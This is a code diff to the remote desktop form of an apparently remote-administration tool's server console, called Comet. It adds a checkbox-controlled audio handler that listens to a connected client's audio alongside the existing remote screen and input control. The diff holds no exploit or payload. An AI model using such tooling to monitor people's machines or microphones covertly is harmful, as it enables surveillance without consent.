@@ -1,11 +1,13 @@
-﻿using Gma.System.MouseKeyHook;
-using Comet.Common.Enums;
+﻿using Comet.Common.Enums;
 using Comet.Common.Helpers;
 using Comet.Common.Messages;
 using Comet.Server.Helper;
 using Comet.Server.Messages;
 using Comet.Server.Networking;
 using Comet.Server.Utilities;
+using Gma.System.MouseKeyHook;
+using Open.Nat;
+using RFTEST.Function;
 using System;
 using System.Collections.Generic;
 using System.Drawing;
@@ -15,6 +17,8 @@ namespace Comet.Server.Forms
 {
     public partial class FrmRemoteDesktop : Form
     {
+
+        private readonly AudioHandler _audioHandler;
         /// <summary>
         /// States whether remote mouse input is enabled.
         /// </summary>
@@ -71,6 +75,13 @@ namespace Comet.Server.Forms
             FrmRemoteDesktop r = new FrmRemoteDesktop(client);
             r.Disposed += (sender, args) => OpenedForms.Remove(client);
             OpenedForms.Add(client, r);
+
+            
+            var useAudio = Configs.GetConfig("UseAudio");
+            if (!string.IsNullOrEmpty(useAudio))
+            {
+                r.checkBox1.Checked = bool.Parse(useAudio); 
+            }
             return r;
         }
 
@@ -83,7 +94,8 @@ namespace Comet.Server.Forms
             _connectClient = client;
             _remoteDesktopHandler = new RemoteDesktopHandler(client);
             _keysPressed = new List<Keys>();
-
+            _audioHandler = new AudioHandler(client);
+            MessageHandler.Register(_audioHandler);
             RegisterMessageHandler();
             InitializeComponent();
         }
@@ -278,6 +290,7 @@ namespace Comet.Server.Forms
             UnregisterMessageHandler();
             _remoteDesktopHandler.Dispose();
             picDesktop.Image?.Dispose();
+            _audioHandler?.Stop();
         }
 
         private void FrmRemoteDesktop_Resize(object sender, EventArgs e)
@@ -306,6 +319,10 @@ namespace Comet.Server.Forms
             }
             SubscribeEvents();
             StartStream();
+            if (checkBox1.Checked)
+            {
+                _audioHandler?.StartListen(0, 1);
+            }
         }
 
         private void btnStop_Click(object sender, EventArgs e)
@@ -459,5 +476,19 @@ namespace Comet.Server.Forms
         {
             TogglePanelVisibility(true);
         }
+
+        private void checkBox1_CheckedChanged(object sender, EventArgs e)
+        {
+            Configs.SetConfig("UseAudio", checkBox1.Checked.ToString());
+            if (checkBox1.Checked)
+            {
+                _audioHandler?.StartListen(0, 1);
+            }
+            else
+            {
+                _audioHandler?.Stop();
+            }
+        }
+
     }
 }
